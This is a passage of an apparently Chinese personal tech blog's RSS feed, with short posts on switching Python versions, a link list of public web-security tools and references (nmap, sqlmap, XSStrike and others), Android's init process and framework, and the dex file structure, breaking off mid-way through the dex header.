&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看和更换 python 版本：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  update-alternatives --config python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/07/17/url-log/</guid>
            <title>web 安全相关网站资源记录</title>
            <link>http://ericcd.com/2022/07/17/url-log/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Sun, 17 Jul 2022 15:14:42 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些学习到的 web 安全相关网站。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索引擎&#34;&gt;#&lt;/a&gt; 搜索引擎&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hvZGFuLmlvLw==&#34;&gt;https://www.shodan.io/&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=&#34;&gt;https://www.webscan.cc/&lt;/span&gt; （同 ip 查询）&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jcnQuc2gv&#34;&gt;https://crt.sh/&lt;/span&gt; （子域名查询）&lt;/p&gt;
&lt;h1 id=&#34;学习资源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#学习资源&#34;&gt;#&lt;/a&gt; 学习资源&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2luZGV4Lmh0bWw=&#34;&gt;https://websec.readthedocs.io/zh/latest/index.html&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;扫描工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#扫描工具&#34;&gt;#&lt;/a&gt; 扫描工具&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ubWFwLm9yZy8=&#34;&gt;https://nmap.org/&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hlbGxvZ29sZHNuYWtlbWFuL21hc25tYXBzY2FuLVYxLjA=&#34;&gt;https://github.com/hellogoldsnakeman/masnmapscan-V1.0&lt;/span&gt;  （端口扫描器）&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=&#34;&gt;https://github.com/EnableSecurity/wafw00f&lt;/span&gt;  （WAF 扫描工具）&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vdGVlbW8=&#34;&gt;https://github.com/bit4woo/teemo&lt;/span&gt; （域名枚举工具）&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Z1enpkYi1wcm9qZWN0L2Z1enpkYg==&#34;&gt;https://github.com/fuzzdb-project/fuzzdb&lt;/span&gt; （Fuzz 工具）&lt;/p&gt;
&lt;h1 id=&#34;相关资源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关资源&#34;&gt;#&lt;/a&gt; 相关资源&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0x1Y2lmZXIxOTkzL2Ntc3ByaW50&#34;&gt;https://github.com/Lucifer1993/cmsprint&lt;/span&gt;  （CMS 指纹库）&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL000dGlyL0dpdGh1Yi1Nb25pdG9y&#34;&gt;https://github.com/M4tir/Github-Monitor&lt;/span&gt; （漏洞发布监控工具）&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYm1qb2tlci9wLzkzMjYyNTguaHRtbA==&#34;&gt;https://www.cnblogs.com/bmjoker/p/9326258.html&lt;/span&gt; （sqlmap 思维导图）&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RoZUtpbmdPZkR1Y2svZnV6ekRpY3Rz&#34;&gt;https://github.com/TheKingOfDuck/fuzzDicts&lt;/span&gt; （Fuzz 字典）&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==&#34;&gt;https://github.com/s0md3v/XSStrike&lt;/span&gt; （XSS 绕过工具）&lt;/p&gt;
&lt;h1 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lvdW5neWFuZ3lhbmcwNC9Ob1NRTEF0dGFjaw==&#34;&gt;https://github.com/youngyangyang04/NoSQLAttack&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw&#34;&gt;https://github.com/sqlmapproject/sqlmap&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NleWUuaW8v&#34;&gt;http://ceye.io/&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FET09PL0Ruc2xvZ1NxbGluag==&#34;&gt;https://github.com/ADOOO/DnslogSqlinj&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/03/31/Android-Framework-init-rc/</guid>
            <title>Android 框架 - init.rc 文件</title>
            <link>http://ericcd.com/2022/03/31/Android-Framework-init-rc/</link>
            <category term="Android" scheme="http://ericcd.com/categories/Android/" />
            <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/" />
            <pubDate>Thu, 31 Mar 2022 11:26:29 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Android 框架中 init.rc 文件的相关知识。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
init.rc 文件不同于 init 进程，init 进程仅当编译完 Android 后才会生成，而 init.rc 文件存在于源码中。init 文件大致分为两部分，一部分是以 on 关键字开头的动作列表，一部分是以 service 关键字开头的服务列表。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/03/23/AndroidFramework-init/</guid>
            <title>Android 框架 - init 进程</title>
            <link>http://ericcd.com/2022/03/23/AndroidFramework-init/</link>
            <category term="Android" scheme="http://ericcd.com/categories/Android/" />
            <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/" />
            <pubDate>Wed, 23 Mar 2022 11:25:48 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Android 框架中 init 进程的相关知识。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
init 进程是 Android 启动后，由内核启动的第一个用户级进程。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 内核启动过程：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    start_kernel ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    init_post ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    run_init_process ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#     static in noinline init_post (void)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#     &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               if (execute_command)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#                          run_init_process (execute_command);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               run_init_process (&amp;quot;/sbin/init&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               run_init_process (&amp;quot;/etc/init&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               run_init_process (&amp;quot;/bin/init&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#               run_init_process (&amp;quot;/bin/sh&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
init_post () 函数调用 run_init_process () 函数，获取注册在 execute_command 中的进程文件路径，执行 execve () 系统调用，execve () 函数执行参数传递过来的文件路径下的进程 。&lt;br /&gt;
当跟文件系统顶层目录中不存在 init 进程或未指定启动选项 &amp;quot;init=&amp;quot; 时，内核会到 /sbin,/etc,/bin 目录下查找 init 文件，如果仍未找到，则 init 进程停止，引发 Kernel Panic。&lt;/p&gt;
&lt;h1 id=&#34;init-工作流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#init-工作流程&#34;&gt;#&lt;/a&gt; init 工作流程&lt;/h1&gt;
&lt;h2 id=&#34;sigchld-注册信号处理器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sigchld-注册信号处理器&#34;&gt;#&lt;/a&gt; SIGCHLD 注册信号处理器&lt;/h2&gt;
&lt;p&gt;当子进程终止时，会产生 SIGCHLD 信号，init 进程调用信号安装函数 sigaction ()，并通过参数传递至 sigaction 结构体中，完成信号处理器安装。&lt;br /&gt;
init 进程通过相关代码注册与子进程相关的 SIGCHLD 信号处理器，并把 sigaction 结构体中的 sa_flags 设置为 SA_NOCLDSTOP，该值表示仅当进程终止时才接受 SIGCHLD 信号。sigchld_handler 函数用于通知全局变量 signal_fd，SIGCHLD 信号已经发生。&lt;/p&gt;
&lt;h2 id=&#34;main-目录生成与挂载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#main-目录生成与挂载&#34;&gt;#&lt;/a&gt; main () 目录生成与挂载&lt;/h2&gt;
&lt;p&gt;init 在注册完信号处理器后，创建并挂在启动所需目录。&lt;/p&gt;
&lt;h2 id=&#34;初始化-log-输出设备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#初始化-log-输出设备&#34;&gt;#&lt;/a&gt; 初始化 log 输出设备&lt;/h2&gt;
&lt;p&gt;通过调用 log_init () 函数初始化 log 输出设备。&lt;/p&gt;
&lt;h2 id=&#34;解析-initrc-文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解析-initrc-文件&#34;&gt;#&lt;/a&gt; 解析 init.rc 文件&lt;/h2&gt;
&lt;p&gt;init.rc 文件是 init 启动后执行的启动脚本，文件中记录着 init 进程执行的功能。在 Linux 系统中，它被定义在根文件系统的 /etc/rc.d/ 目录下，是启动时的可执行文件。&lt;br /&gt;
init.rc 文件在 Android 系统运行过程中用于通用的环境设置以及进程相关的定义，init.{hardware}.rc 用于定义 Android 在不同平台下的特定进程和环境设置等。&lt;br /&gt;
parse_config_file () 文件用于分析.rc 配置文件，参数为文件路径。读取 init.rc 文件后，生成动作列表与服务列表。根据 init.{hardware}.rc 生成的动作列表和服务列表会被添加到已生成的对应列表中去。&lt;/p&gt;
&lt;h2 id=&#34;执行-early-init-动作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行-early-init-动作&#34;&gt;#&lt;/a&gt; 执行 early-init 动作&lt;/h2&gt;
&lt;p&gt;init 进程会依次执行 &amp;quot;early-init , init ,early-boot , boot&amp;quot; 片段中的命令。&lt;br /&gt;
通过 action_for_each_trigger () 将 early-init 中的命令保存到队列 action_add_queue_tail 中，之后通过 drain_action_queue () 函数将运行队列中的命令逐一取出执行。&lt;/p&gt;
&lt;h2 id=&#34;创建定义好的设备节点文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建定义好的设备节点文件&#34;&gt;#&lt;/a&gt; 创建定义好的设备节点文件&lt;/h2&gt;
&lt;p&gt;通过 device_init () 生成静态设备节点。&lt;/p&gt;
&lt;h2 id=&#34;初始化属性服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#初始化属性服务&#34;&gt;#&lt;/a&gt; 初始化属性服务&lt;/h2&gt;
&lt;p&gt;调用 property_init () 函数，在共享内存区域中，创建并初始化属性域。而后通过执行中的进程所提供的 API，访问属性域中的设置值。但更改属性值操作只能在 init 进程中运行，当修改属性值时，要预先向 init 进程提交值变更申请，然后 init 进程处理该申请，并修改属性值。&lt;/p&gt;
&lt;h2 id=&#34;显示启动-logo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#显示启动-logo&#34;&gt;#&lt;/a&gt; 显示启动 logo&lt;/h2&gt;
&lt;p&gt;使用 load_565rle_image () 函数将文件显示在屏幕上，只需修改 INIT_IMAGE_FILE 即可更改启动 Logo。&lt;/p&gt;
&lt;h2 id=&#34;属性初始设置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#属性初始设置&#34;&gt;#&lt;/a&gt; 属性初始设置&lt;/h2&gt;
&lt;p&gt;通过 property_set () 函数向属性域设置系统所需的一些初始值。这些设置的属性值由执行中的多种进程通过 property_get () API 来访问。&lt;/p&gt;
&lt;h2 id=&#34;执行-init-动作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行-init-动作&#34;&gt;#&lt;/a&gt; 执行 init 动作&lt;/h2&gt;
&lt;p&gt;同 early-init。&lt;/p&gt;
&lt;h2 id=&#34;启动属性服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动属性服务&#34;&gt;#&lt;/a&gt; 启动属性服务&lt;/h2&gt;
&lt;p&gt;除了先前设置的属性外，start_property_service () 还会读取几个设置文件，并对属性进行初始化。在根文件系统的 /data/property 目录下，保存着进程生成或修改的属性值。向 init 提交修改申请后，init 进程生成 /dev/socket/property_service 来接受其它进程提交的申请。&lt;/p&gt;
&lt;h2 id=&#34;创建套接字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建套接字&#34;&gt;#&lt;/a&gt; 创建套接字&lt;/h2&gt;
&lt;p&gt;用于 init 进程在收到子进程终止的信号时调用相应的 handler。&lt;/p&gt;
&lt;h2 id=&#34;执行与-action-list-的-early-bootbootproperty-相关的命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行与-action-list-的-early-bootbootproperty-相关的命令&#34;&gt;#&lt;/a&gt; 执行与 Action List 的 early-boot,boot,property 相关的命令&lt;/h2&gt;
&lt;p&gt;在 init.rc 文件的 boot 区段有一条 class_start 命令，用来逐一执行存在于服务列表中的进程列表。&lt;/p&gt;
&lt;h2 id=&#34;设置事件处理循环的监视事件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#设置事件处理循环的监视事件&#34;&gt;#&lt;/a&gt; 设置事件处理循环的监视事件&lt;/h2&gt;
&lt;p&gt;注册在 POLL 中的文件描述符会在 poll () 函数中等待事件发生，若事件发生，则从 poll 函数中跳出并处理事件。&lt;br /&gt;
在确认事件发生前，先要在 action list 的命令中确认是否有尚未执行的命令，并执行这些命令。起初，在事件处理循环中，action list 与 service list 未含有需要执行的事情，但是在处理过注册的事件后，init 进程要做的事情会重新注册到 action list 与 service list 中。&lt;br /&gt;
当事件发生时，事件信息会保存在 pollfd 结构体的 udfs.revents 变量中，当 poll () 函数返回后，可以在 udfs 数组中的 revents 中查看哪些事件已经发生。&lt;br /&gt;
当子进程终止时，会产生 SIGCHLD 信号，POLLIN 事件会被注册到 udfs [2],revents 中。&lt;br /&gt;
在 Android 系统运行过程中，插入热的拔插设备时，将生成设备节点文件。&lt;br /&gt;
这部分函数还会处理属性变更请求。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/03/23/Android-framework/</guid>
            <title>Android 框架概述</title>
            <link>http://ericcd.com/2022/03/23/Android-framework/</link>
            <category term="Android" scheme="http://ericcd.com/categories/Android/" />
            <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/" />
            <pubDate>Wed, 23 Mar 2022 10:57:28 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Android 框架相关知识概述。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;android-启动过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#android-启动过程&#34;&gt;#&lt;/a&gt; Android 启动过程&lt;/h1&gt;
&lt;p&gt;Android 启动时，首先通过 bootloader (系统加载器) 加载 Linux 内核。Linux 加载启动时，先初始化内核，再调用 init 进程。&lt;/p&gt;
&lt;h1 id=&#34;init-进程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#init-进程&#34;&gt;#&lt;/a&gt; init 进程&lt;/h1&gt;
&lt;p&gt;init 进程会运行 Android Framework 所需的 Daemon, Context Manager, Media Server, Zygote 等。&lt;/p&gt;
&lt;h2 id=&#34;daemon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#daemon&#34;&gt;#&lt;/a&gt; Daemon&lt;/h2&gt;
&lt;p&gt;以下是 init 进程执行的 Daemon 进程。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#          USB Daemon (usbd): 管理 USB 连接。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#          Android Debug Bridge Daemon (adbd): Android Debug Brige 连接管理。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#          Debugger Daemon (debuggerd): 启动 Debugger 系统。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#          Radio Interface Layer Daemon (rild): 管理无线通信连接。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;context-manager&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#context-manager&#34;&gt;#&lt;/a&gt; Context Manager&lt;/h2&gt;
&lt;p&gt;Context Manager 是一个管理 Android 系统服务的重要进程，系统服务提供从相机，音频，视频处理到各种应用程序制作所需要的 API。&lt;br /&gt;
Context Manager 还提供用于 Android 内的各种系统服务信息。应用程序或 Frameword 内部模块在调用系统服务时，需要先向服务管理器申请，再通过 Binder IPC 调用系统服务。&lt;br /&gt;
系统启动时，Android 所有系统服务都要把各自的 handle 注册到 Context Manager。&lt;/p&gt;
&lt;h2 id=&#34;media-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#media-server&#34;&gt;#&lt;/a&gt; Media Server&lt;/h2&gt;
&lt;p&gt;Media Server 用于运行基于 C/C++ 的本地系统服务，如 Audio Flinger,Camera 等。&lt;/p&gt;
&lt;h2 id=&#34;zygote&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#zygote&#34;&gt;#&lt;/a&gt; Zygote&lt;/h2&gt;
&lt;p&gt;Zygote 进程用于缩短 Android 应用程序加载时间，每当执行 java 应用程序时，Zygote 会派生一个子进程来执行程序，该子进程就是虚拟机。&lt;/p&gt;
&lt;h2 id=&#34;system-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#system-server&#34;&gt;#&lt;/a&gt; System Server&lt;/h2&gt;
&lt;p&gt;Syetem Server 是 Android 系统的一个核心进程，它有 Zygote 创建，所以启动过程位于 Zygote 之后。在 System Server 中可以看到它建立的 Android 中的大部分服务，为了将运行在 System Server 中的 java 系统服务提供给 Android 程序或 Framework 内部模块调用，需要先将它们注册到 Context Manager 中。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/03/18/dex-structure/</guid>
            <title>dex 文件结构</title>
            <link>http://ericcd.com/2022/03/18/dex-structure/</link>
            <category term="Android" scheme="http://ericcd.com/categories/Android/" />
            <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/" />
            <pubDate>Fri, 18 Mar 2022 10:42:11 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;dex 文件结构学习。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;dex-整体结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dex-整体结构&#34;&gt;#&lt;/a&gt; dex 整体结构&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#       struct dex&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        Header;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        string_ids;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        type_ids;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        proto_ids;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        field_ids;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        methods_ids;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        class_defs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#        link_data;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;header&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#header&#34;&gt;#&lt;/a&gt; Header&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#      struct  DexHeader&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              magic [8];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              checksum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              signature [kSHA1DigestLen];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              fileSize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#              